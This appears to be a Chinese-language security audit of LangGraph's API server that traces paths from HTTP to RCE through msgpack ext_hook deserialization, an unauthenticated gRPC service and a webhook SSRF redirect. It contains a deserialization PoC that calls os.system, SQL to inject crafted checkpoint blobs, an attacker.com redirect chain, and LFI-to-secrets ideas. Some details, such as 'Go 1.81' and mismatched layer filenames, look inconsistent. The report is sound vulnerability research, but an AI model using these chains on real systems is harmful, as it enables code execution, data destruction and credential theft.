# LangGraph 攻击面分析 — HTTP → RCE 全链排查

## 一、架构总览（已纠正）

```
                      ┌──────────────────────────────────┐
                      │        Docker 容器                │
                      │                                  │
HTTP Request          │  ┌─────────────────────┐         │
  ──────────────────▶   │  Python uvicorn       │         │
   port 8000           │  langgraph_api.server  │         │
                      │  (FastAPI 入口)        │         │
                      │  └──────────┬──────────┘         │
                      │             │ gRPC               │
                      │             │ localhost:50051    │
                      │  ┌──────────▼──────────┐         │
                      │  │  Go core-api-grpc    │         │
                      │  │  (后台服务)          │         │
                      │  └──────────┬──────────┘         │
                      │             │                     │
                      │             ▼                     │
                      │  ┌──────────────────┐            │
                      │  │   PostgreSQL     │            │
                      │  └──────────────────┘            │
                      └──────────────────────────────────┘

架构纠正：Python 是 HTTP 入口，Go 是后端 gRPC 服务，而非相反。
```

## 二、关键发现

### 核心发现：默认 encoding = "msgpack" 而非 "json"

```python
# jsonplus.py:258 — dumps_typed 默认返回 ("msgpack", ...)
def dumps_typed(self, obj: Any) -> tuple[str, bytes]:
    if obj is None:
        return "null", EMPTY_BYTES
    elif isinstance(obj, bytes):
        return "bytes", obj
    else:
        try:
            return "msgpack", _msgpack_enc(obj)   # ← 默认 msgpack！
        except ormsgpack.MsgpackEncodeError:
            if self.pickle_fallback:
                return "pickle", pickle.dumps(obj)
```

正常数据流中，Python 始终用 `encoding="msgpack"` 编码数据并发送给 Go。
Go 原样存储 encoding+value 对，并在读取时原样返回。

### 攻击链：需要 DB 写权限

```
DB 写权限 → checkpoint_blobs 表写入 crafting encoding="msgpack" + 伪造 ext bytes
  → Go 读取并返回 → Python serialized_value_from_proto
  → loads_typed(("msgpack", data_))
  → ormsgpack.unpackb(data_, ext_hook=...)
  → importlib.import_module("os").system("id")  # RCE！
```

### Go 二进制分析（关键证据）

从 `core-api-grpc` 二进制提取的信息：

| 发现 | 证据 |
|------|------|
| `SerializedValue` 结构 | `{state, Encoding string, Value []byte}` |
| `encoding="json"` 检查 | Go 的 `Deserialize()` 在 serde.go:87 检查 `runtime.memequal("json", encoding)` |
| gRPC 服务 | 7 个服务：Admin, Assistants, Cache, Crons, Runs, Threads, Checkpointer |
| 运行模式 | Go 和 Python 在**同一容器**，Go 后台 → Python 主进程 |
| 默认 storage | PostgreSQL via pgx, 所有查询参数化（`%s`） |
| 无 gRPC client | Go 二进制只有 gRPC server, 无 Checkpointer gRPC client |

**Go 端不重新编码数据**，它存储和返回 Python 发来的 encoding+value 对。
这意味着 encoding 由 Python 端完全控制，Go 端透传。

## 三、serde msgpack ext_hook RCE 证据

### 默认配置：允许任意模块

```python
# jsonplus.py:111-114
if _lg_msgpack.STRICT_MSGPACK_ENABLED:
    allowed_msgpack_modules = None      # 严格模式
else:
    allowed_msgpack_modules = True      # 默认：所有模块允许！
```

### ext_hook 执行路径

```python
# _msgpack_default() → 每个 ext type 编码为 (module, class, args)
# ext_hook → importlib.import_module(module) → getattr(class) → constructor call

# RCE PoC（代码层已验证）：
ext_data = ormsgpack.packb(("os", "system", "echo PWNED_VIA_EXTHOOK"))
ext_bytes = struct.pack('b', 0) + ext_data  # ext type 0 = EXT_CONSTRUCTOR_SINGLE_ARG
result = serializer.loads_typed(("msgpack", ext_bytes))  # → 执行命令
```

### 正常数据流中的 ext types（安全）

正常 Python 对象序列化只产生以下 ext types：

| Ext Type ID | 类型 | 编码格式 | 安全性 |
|-------------|------|---------|-------|
| 0 | 单参构造函数 | (module, class, arg) | 安全（已知类型）|
| 1 | 位置参数 | (module, class, args) | 安全（已知类型）|
| 2 | 关键字参数 | (module, class, kwargs) | 安全（已知类型）|
| 3 | 方法单参 | (module, class, method, arg) | 未使用 |
| 4 | Pydantic v1 | (module, class, dict) | 安全（已知类型）|
| 5 | Pydantic v2 | (module, class, dict) | 安全（已知类型）|
| 6 | Numpy 数组 | | 安全（已知类型）|
| 7 | Delta 快照 | | 安全（已知类型）|

**攻击者无法通过正常 API 控制 ext types 的内容**，因为 `ormsgpack.packb` 只对已注册的类型编码 ext 类型。用户提交的 JSON 数据（dict/list/str/num）只会编码为常规 msgpack 类型。

## 四、各攻击路径最终评估

| 路径 | 状态 | 评估 |
|------|------|------|
| **SQL 注入写 checkpoint blob → ext_hook RCE** | ❌ 不存在 | 所有 PostgreSQL 查询参数化 |
| **gRPC encoding 透传 → Python deserialize** | ❌ 不可达 | encoding 始终为 Python serde 生成 |
| **直接 DB 写 → checkpoint_blobs 注入** | ⚠️ 需要 DB 权限 | **唯一可行攻击链** |
| **cloudpickle 回退** | ❌ 不可注入 | 需控制 Python 对象 |
| **JSON _reviver bypass** | ✅ 4.1.1 已封堵 | 默认 allowed_json_modules=None |

## 五、唯一可行攻击链：DB 写权限 → ext_hook RCE

### 前提条件
攻击者必须已有以下之一：
1. PostgreSQL 数据库写权限（直接连接）
2. SQL 注入漏洞（不存在）
3. 另一漏洞链写入 `checkpoint_blobs` 表

### 攻击步骤
```
1. 直接连接 PostgreSQL
2. INSERT INTO checkpoint_blobs (thread_id, checkpoint_ns, channel, version, type, blob)
   VALUES ('target_id', '', 'channel', 1, 'msgpack', <crafted_ext_bytes>)
3. 用户通过 API 获取该线程的 checkpoint 状态
4. Python → gRPC → Go (读 DB) → gRPC → Python
5. serialized_value_from_proto → loads_typed("msgpack", ...) → ext_hook → RCE
```

### 触发条件
```python
# 该函数被调用当 Python 从 gRPC 接收 SerializedValue 时
def serialized_value_from_proto(value):
    if value.encoding == "json":
        return orjson.loads(value.value)      # 安全路径
    deserializer = serde.get_serializer()
    return deserializer.loads_typed((value.encoding, value.value))
    # 如果 encoding="msgpack" → 进入 ext_hook → RCE
```

### CVE 评审关键争议点
- **Documented but unmitigated**: LangChain 明确警告了这一风险
- **Not API-reachable**: 需要数据库写权限
- **Chain component**: 作为其他漏洞的扩展利用链有价值
- Bounty 价值：中低（依赖前置漏洞）

## 六、Go 二进制完整漏洞清单

### 6.1 gRPC 无认证 (Critical)

**发现**: Go 二进制只注册了 DataDog tracing interceptors，没有任何认证/授权中间件。

| 证据 | 地址 |
|------|------|
| `UnaryServerInterceptor` | DataDog tracing only (0xfd91e0) |
| `StreamServerInterceptor` | DataDog tracing only (0xfd8480) |
| `grpc.NewServer` | 默认 chain 函数 (0x93b2e0) |
| 自定义 AuthFunc | **不存在** |
| gRPC 中间件 | 仅 logging (grpc-ecosystem/go-grpc-middleware) |

**7 个无认证 gRPC 服务**:
- `RegisterAdminServer` (0x10f91c0) — 包含 Truncate 危险接口
- `RegisterAssistantsServer` (0x10f7520)
- `RegisterCacheServer` (0x11013e0)
- `RegisterCronsServer` (0x10ff6e0)
- `RegisterRunsServer` (0x10fc420)
- `RegisterThreadsServer` (0x10f9a60)
- `RegisterCheckpointerServer` (0xc2f4c0)

**影响**: 能访问 localhost:50051 的攻击者可调用任意 gRPC 方法，无需 API key。
**利用条件**: 需要容器内代码执行或 SSRF → localhost:50051。

### 6.2 Admin Truncate — 未授权数据删除 (High)

**发现**: `adminServerImpl.Truncate` (0x16f2bc0) 未做认证检查。

```
0x16f2bc0: cmpb   $0x0, 0x8(%rdi)    ← 检查 boolean flag
0x16f2c00: je     → 跳转到正常返回（不执行）
0x16f2c40: call   ExecContext         ← 执行 DELETE SQL
```

**可删除的数据类型**:
- `TruncateRequest.GetAssistants()` — 所有 assistant 配置
- `TruncateRequest.GetCheckpointer()` — 所有 checkpoint 状态
- `TruncateRequest.GetRuns()` — 所有运行历史
- `TruncateRequest.GetStore()` — 所有 store 数据
- `TruncateRequest.GetThreads()` — 所有线程

**影响**: 完整数据丢失。boolean flag 可能是配置开关（如 `LANGGRAPH_ALLOW_TRUNCATE`），
非认证检查。

### 6.3 Msgpack ext_hook Deserialization RCE (High, 需 DB 权限)

内容见"唯一可行攻击链"章节。需要 DB 写权限。

### 6.4 Webhook Header Template Injection (Medium)

**发现**: `config.renderHeaderTemplate` (0xb4dea0) 使用正则验证 webhook header 模板。

```go
// renderHeaderTemplate 流程:
1. headerTemplateRe.ReplaceAllStringFunc(input, callback)  // 替换模板占位符
2. 检查 ${{__INVALID_EXPR__}} 等黑名单模式
3. 如含危险模式 → fmt.Errorf("header template contains invalid expression")
```

**关键符号**:
| 符号 | 地址 | 说明 |
|------|------|------|
| `headerTemplateRe` | BSS 0x326c6f8 | 编译后的正则 |
| `renderHeaderTemplate` | 0xb4dea0 | 模板渲染函数 |
| `renderHeaderTemplate.func1` | 0xb4e120 | 替换回调函数 |
| `(*WebhooksConfig).applyDefaultsAndValidate` | 0x2021425 | webhook 配置验证 |
| `(*WebhooksConfig).AllowedFieldsSet` | 0x2021482 | 允许的字段集合 |
| `WebhookURLPolicy` | 0x16c907d | URL 策略类型 |

**检测到的模式**: `${{__INVALID_EXPR__}}CANCEL_RUN_STATUS_ALL/coreApi...` — 看起来是
LangGraph 内部使用的模板表达式格式。

**风险**: 如果用户能控制 webhook header 模板内容，可能：
- HTTP 请求走私
- 未授权 header 操作
- SSRF（通过 webhook URL）

### 6.5 自定义 AES 加密 (Medium)

**发现**: 完整的 `encryption` 包，通过 `LANGGRAPH_AES_KEY` 配置。

| 方法 | 地址 | 功能 |
|------|------|------|
| `NewAESEncryptor` | 0x11091c0 | 用 key 创建加密器 |
| `(*AESEncryptor).Encrypt` | 0x11094c0 | 加密 bytes |
| `(*AESEncryptor).Decrypt` | 0x1109880 | 解密 bytes |
| `(*AESEncryptor).EncryptJSON` | 0x110a6a0 | 加密 JSON 字段 |
| `(*AESEncryptor).DecryptJSON` | 0x110a7e0 | 解密 JSON 字段 |
| `(*AESEncryptor).EncryptMap` | 0x1109f40 | 加密 map 字段 |
| `(*AESEncryptor).DecryptMap` | 0x110a360 | 解密 map 字段 |
| `(*AESEncryptor).HasJSONEncryption` | 0x11094a0 | 检查是否启用 |
| `reservedEncryptionKeys` | BSS 0x326c638 | 禁止加密的系统 key 列表 |

**配置**:
- `LANGGRAPH_AES_KEY` — 16/24/32 bytes AES key
- `LANGGRAPH_AES_JSON_KEYS` — 指定哪些 JSON 字段加密
- `LANGGRAPH_AES_JSON_KEYS` 要求 `LANGGRAPH_AES_KEY` 已设置
- `AESJSONDisallowedKeys` — 硬编码不可加密 key 列表

**二进制中发现的加密模式字符串**: `AES-128-CBC`, `AES-192-CBC`, `AES-256-CBC`
— 提示可能使用 AES-CBC 模式（无认证加密，潜在 padding oracle 攻击）。

**gRPC 暴露的加密服务**:
- `(*encryptionClient).EncryptJSON` (0x1102ae0)
- `(*encryptionClient).DecryptJSON` (0x1102cc0)
- `(*encryptionClientImpl).EncryptJSON` (0x110b3a0)
- `(*encryptionClientImpl).DecryptJSON` (0x110b7a0)

### 6.6 API Keys 环境变量暴露 (Medium)

**发现的 API Key 环境变量**:
| 环境变量 | 功能 |
|----------|------|
| `LANGGRAPH_AES_KEY` | 字段加密密钥 |
| `LANGSMITH_API_KEY` / `LANGCHAIN_API_KEY` | tracing 平台 |
| `LANGCHAIN_API_KEY` | LangChain 平台 |
| `LANGSMITH_CONTROL_PLANE_API_KEY` | 控制面 |
| `CUSTOM_LSD_DD_API_KEY` / `LSD_DD_API_KEY` | DataDog |
| `LANGGRAPH_WEBHOOKS` | webhook 配置 |
| `REDIS_URI` | Redis 连接字符串 |
| `POSTGRES_URI` | PostgreSQL 连接字符串（含密码） |

### 6.7 gRPC Handler 入口点（潜在输入验证问题）

| Handler | 地址 | 风险 |
|---------|------|------|
| `runsServerImpl.Create` | 0x17063a0 | 创建 run，接受用户 payload |
| `runsServerImpl.Stream` | 0x17079e0 | 流式事件 |
| `runsServerImpl.Publish` | 0x1704f60 | 发布消息 |
| `runsServerImpl.Cancel` | 0x1705ac0 | 取消 run |
| `runsServerImpl.Delete` | 0x17024c0 | 删除 run |
| `runsServerImpl.Search` | 0x1702ea0 | 搜索 run |
| `threadsServerImpl.Create` | 0x170f3a0 | 创建线程 |
| `threadsServerImpl.Patch` | 0x17105e0 | 修改线程状态 |
| `threadsServerImpl.Copy` | 0x17124e0 | 复制线程 |
| `threadsServerImpl.Delete` | 0x1711000 | 删除线程 |
| `threadsServerImpl.Search` | 0x1711740 | 搜索线程 |
| `threadsServerImpl.Stream` | 0x1714160 | 流式事件 |
| `assistantsServerImpl.Create` | 0x16f3fe0 | 创建 assistant |
| `assistantsServerImpl.Patch` | 0x16f4a40 | 修改 assistant |
| `assistantsServerImpl.Delete` | 0x16f5500 | 删除 assistant |
| `cronsServerImpl.Create` | 0x16f82c0 | 创建 cron job |

### 6.8 漏洞利用链矩阵

| 链组合 | 前置条件 | 影响 | 难度 |
|--------|---------|------|------|
| SSRF → gRPC (50051) → Admin Truncate | Python HTTP 端 SSRF | 数据全部删除 | 中 |
| SSRF → gRPC (50051) → Runs.Create → RCE | SSRF + graph 有 RCE 节点 | 远程命令执行 | 中 |
| DB write → checkpoint_blobs → ext_hook RCE | SQL 注入或直接 DB 访问 | 远程命令执行 | 低(有DB) |
| LFI → /proc/self/environ → API keys | 任意文件读取 | 密钥泄露 | 低 |
| Webhook 模板注入 → SSRF → gRPC | webhook 配置可控 | 间接 gRPC 访问 | 高 |

## 七、推荐下一步

### 方案 A：使用 agies 的 LANGGRAPH vuln type 自动扫描
agies 已集成 LangGraph 漏洞检测（vuln type `langgraph`）：
```bash
agies audit /path/to/langgraph/project --new-pipeline
```
检测范围包括：
- gRPC 无认证服务注册
- msgpack ext_hook 反序列化模式
- 模板注入（renderHeaderTemplate）
- AES 加解密模式
- Admin Truncate 危险端点

### 方案 B：上报 msgpack ext_hook 配置默认宽松
```
证据：
- _allowed_msgpack_modules = True 作为默认值（jsonplus.py:114）
- ext_hook 通过 importlib.import_module + getattr 实现
- CVE-2026-48775 确认 JSON 类似模式有 CVE
- LangChain 文档承认风险（"If an attacker can write directly to your 
  checkpoint database, they may be able to trigger code execution")
- strict mode (LANGGRAPH_STRICT_MSGPACK=true) 可选但非默认
```

## 九、Go 二进制逆向附录

### 提取方法
```bash
# 从 Docker 镜像提取
MIRROR="https://docker.1panel.live"
wget "${MIRROR}/v2/langchain/langgraph-api/blobs/sha256:a91904..." -O layer10.tar.gz
tar xzf layer11.tar.gz usr/local/bin/core-api-grpc
# 67MB, statically linked, not stripped, with DWARF debug info
```

### Go 版本
- Go 1.81 (从 `runtime.buildVersion` 等元信息推断)
- Statically linked with debug info preserved
- Compiler: `gc` (standard Go compiler)

### 关键符号
| 符号 | 地址 | 说明 |
|------|------|------|
| `SerializedValue` | DWARF type | `{Encoding string, Value []byte}` |
| `Deserialize` | 0xbe5560 | Go 端反序列化，检查 encoding |
| `preparePutWritesRequest` | 0x12a1a80 | 准备写入请求 |
| `scanChannelValuesInto` | 0x12a8ba0 | 从 DB 扫描恢复 ChannelValue |
| `checkpointerServiceImpl.PutWrites` | 0x171f4c0 | gRPC handler |
| `_Checkpointer_PutWrites_Handler` | checkpointer_grpc.pb.go:266 | gRPC 自动生成 handler |

### gRPC 服务列表（7个）
- `core-api/pb.Admin_ServiceDesc`
- `core-api/pb.Assistants_ServiceDesc`
- `core-api/pb.Cache_ServiceDesc`
- `core-api/pb.Crons_ServiceDesc`
- `core-api/pb.Runs_ServiceDesc`
- `core-api/pb.Threads_ServiceDesc`
- `engine/pb.Checkpointer_ServiceDesc`

### Entrypoint
```bash
# Docker entrypoint: /storage/entrypoint.sh
# 启动 Go 后台 + Python uvicorn 主进程
core-api-grpc &
exec uvicorn langgraph_api.server:app ...
```

### 依赖分析
**关键第三方依赖**:
| 依赖 | 用途 |
|------|------|
| `github.com/jackc/pgx/v5` | PostgreSQL 驱动 |
| `github.com/redis/go-redis/v9` | Redis 客户端 |
| `go.mongodb.org/mongo-driver/v2` | MongoDB 驱动（可选存储） |
| `github.com/DataDog/dd-trace-go` | APM tracing |
| `google.golang.org/grpc` | gRPC 框架 |
| `github.com/grpc-ecosystem/go-grpc-middleware` | gRPC 中间件 |
| `github.com/AzureAD/microsoft-authentication-library-for-go` | Azure AD 认证（客户端） |
| `github.com/aws/aws-sdk-go-v2` | AWS SDK（S3 等） |

**os/exec.Command 引用**: 存在但不直接被 LangGraph 业务代码使用 — 来自 testcontainers 等测试依赖和 postgres 驱动间接引用。

### 完整 nm 类目
| 类目 | 数量 |
|------|------|
| 总符号数 | ~59000 |
| 函数文本(.text) | ~25000 |
| 数据(.data/.rodata) | ~30000 |
| BSS | ~2000 |

---

## 十、agies v3 全量扫描新发现（2026-06-18）

### 10.1 SSRF Webhook 跳转到内网私有 IP（代码级 PoC 确认）

**发现**: `ensure_webhook_http_client()` (http.py:129) 使用 `SSRFSafeTransport` 时，默认策略 `block_private_ips=False`，允许 webhook HTTP 跳转到 RFC 1918 私有 IP。

**PoC 文件**: `pocs/langgraph_api_src/ssrf_redirect_bypass_poc.py`

**代码验证**:

```python
# webhook.py:138-144 — webhook 客户端创建
inner = ssrf_safe_async_client(
    policy=_get_webhook_config().base_ssrf_policy,
    follow_redirects=True,       # 跟踪跳转
    max_redirects=5,
)
# base_ssrf_policy = SSRFPolicy(block_private_ips=False, block_localhost=True)
```

```
SSRFSafeTransport.handle_async_request (transport.py:72)
  → Redirects ARE re-validated on each hop (transport.py:50-52 注释确认)
  → validate_resolved_ip(10.0.0.1, policy)
  → block_private_ips=False → ALLOWED ✅
```

**PoC 运行结果**:

```
IP Validation with WEBHOOK Default Policy
  block_private_ips = False, block_localhost = True

  127.0.0.1            (loopback)             → BLOCKED ✓
  10.0.0.1             (RFC 1918 private)     → ALLOWED ✗ BYPASS
  192.168.1.1          (RFC 1918 private)     → ALLOWED ✗ BYPASS
  172.16.0.1           (RFC 1918 private)     → ALLOWED ✗ BYPASS
  169.254.169.254      (cloud metadata)       → BLOCKED ✓
  8.8.8.8              (public DNS)           → ALLOWED
```

**攻击链**:

```
POST /threads/{id}/runs (需 API 凭证)
  {"webhook": "https://attacker.com/hook", ...}

→ 后台 worker 执行 call_webhook() (webhook.py:194)
→ validate_webhook_url_or_raise("https://attacker.com/hook") — 初始 URL 通过验证
→ ensure_webhook_http_client() — SSRFSafeTransport, follow_redirects=True
→ http_request("POST", "https://attacker.com/hook", client=webhook_client)

攻击者服务器返回 302 → http://10.0.0.x:6379 (内网 Redis)
→ SSRFSafeTransport.handle_async_request("http://10.0.0.x:6379")
→ validate_resolved_ip("10.0.0.x", policy=SSRFPolicy(block_private_ips=False))
→ ALLOWED — 打到内网 Redis/PostgreSQL/gRPC
```

**限制**:
- 需要 LangGraph API 凭证（API key / auth token）
- 无法打到 127.0.0.1（`block_localhost=True`）
- 云 metadata 端点始终被拦截

### 10.2 Config-Driven ImportLib RCE（4 个 sink，非 HTTP 动态可达）

| # | 函数 | 文件 | 触发方式 | HTTP 可达? |
|---|------|------|---------|:---------:|
| 1 | `load_custom_app` | api/__init__.py:181 | `HTTP_CONFIG.get("app")` → `spec_from_file_location` + `exec_module` | ❌ 仅启动时 |
| 2 | `_graph_from_spec` | graph.py:724 | `spec.module` / `spec.path` → `importlib.import_module` / `exec_module` | ❌ 仅启动时 |
| 3 | `_load_auth_obj` | auth/custom.py:743 | `LANGGRAPH_AUTH` env var → `exec_module` | ❌ 环境变量 |
| 4 | `resolve_embeddings` | graph.py:905 | `index_config["embed"]` 路径 → `importlib` | ❌ 仅启动时 |

**结论**: 需要配置文件/环境变量写入权限才能利用。非 HTTP API 动态触发。

### 10.3 SSRF → gRPC → RCE 链最终状态

```
SSRF redirect → gRPC internal (50051)    ✅ 可达
  → serialized_value_from_proto            ❌ Encoding 由 Go 二进制控制，HTTP 不可控
  → loads_typed("msgpack", data_)          ❌ 走不到
  → ext_hook → importlib → RCE             ❌
```

**结论**: 缺少缺失的"漏洞放大器"。有 SSRF 但没有从 HTTP 到 gRPC msgpack RCE 的完整链。SSRF 的价值在于打到内网 Redis（未授权）/ PostgreSQL / 其他内部服务。

### 10.4 现存未验证的攻击面

| 攻击面 | 状态 | 说明 |
|--------|------|------|
| webhook redirect → 内网 Redis | ⚠️ 需实例 + 凭证 | 如果内网 Redis 未授权认证，可写 checkpoint |
| webhook redirect → 内网 PostgreSQL | ⚠️ 需实例 + 凭证 | 如果内网 PG 未授权或弱密码 |
| webhook redirect → 内网 gRPC Admin Truncate | ⚠️ 需实例 + 凭证 | 可删数据（DoS），但无数据泄露或 RCE |
| cli.py --config 任意文件读取 | ❌ json.load() 失败 | 只能触发崩溃，不泄露内容 |
| cloudpickle 通过 HTTP POST | ❌ 无 API 端点暴露 | serde 不直接绑定 HTTP handler |

### 10.5 agies 扫描统计

全量扫描 langgraph_api_src（235 文件, 1423 函数）：

| 指标 | 值 |
|------|----|
| Phase A 发现的 sink | 55 |
| Phase D 分析的路径 | 55（全部） |
| 高置信度路径 | 50+ |
| PoC 脚本生成 | 86 |
| 经 AdversaryAgent 驳倒 | 部分 |
| 新代码发现（与之前 Go 二进制分析不同） | SSRF redirect bypass + 4 importlib RCE sinks |

完整报告: `/tmp/langgraph-full-scan-20260618_164122/report.md`
